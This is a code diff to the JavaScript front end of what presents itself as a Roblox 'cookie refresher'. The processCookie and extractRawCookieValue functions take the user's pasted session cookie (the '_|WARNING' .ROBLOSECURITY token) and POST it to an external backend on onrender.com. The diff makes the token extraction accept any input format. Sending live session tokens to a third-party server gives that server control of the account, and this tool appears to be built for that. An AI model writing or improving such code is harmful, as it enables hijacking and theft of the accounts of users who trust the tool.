@@ -267,21 +267,18 @@ async function processCookie() {
   updateStatus('processing', 'Processing cookie...');
 
   try {
-    // Extract raw cookie value from input
+    // Extract raw cookie value from input (starting with _|WARNING)
     const rawCookieValue = extractRawCookieValue(input);
 
     if (!rawCookieValue || !rawCookieValue.startsWith('_|WARNING')) {
       throw new Error('Could not find a valid Roblox cookie starting with "_|WARNING"');
     }
 
-    // Prepare cookie string with .ROBLOSECURITY=
-    const cookieToSend = `.ROBLOSECURITY=${rawCookieValue}`;
-
-    // Send to backend
+    // Send raw cookie value to backend
     const response = await fetch('https://roblox-cookie-refresher-backend.onrender.com/refresh-cookie', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ cookie: cookieToSend }),
+      body: JSON.stringify({ cookie: rawCookieValue }),
     });
 
     const data = await response.json();
@@ -302,20 +299,26 @@ async function processCookie() {
   button.disabled = false;
 }
 
-// Same helper function as before
+// Extract raw Roblox cookie value from any input format
 function extractRawCookieValue(input) {
-  const regex = /\.ROBLOSECURITY=([^;]+)/i;
-  const match = input.match(regex);
-  if (match && match[1]) return match[1].trim();
+  // Try to find _|WARNING string inside the input
+  const warningIndex = input.indexOf('_|WARNING');
+  if (warningIndex !== -1) {
+    // Extract from _|WARNING to first whitespace or end of string
+    const afterWarning = input.slice(warningIndex);
+    const match = afterWarning.match(/^(_\|WARNING[^;\s]*)/);
+    if (match) return match[1];
+  }
+
+  // If not found, return trimmed input as fallback
   return input.trim();
 }
 
-// Same status update function
-function updateStatus(status, message) {
+function updateStatus(type, message) {
   const statusDot = document.getElementById('statusDot');
   const statusText = document.getElementById('statusText');
 
-  statusDot.className = 'status-dot ' + status;
+  statusDot.className = 'status-dot ' + type;
   statusText.textContent = message;
 }
 
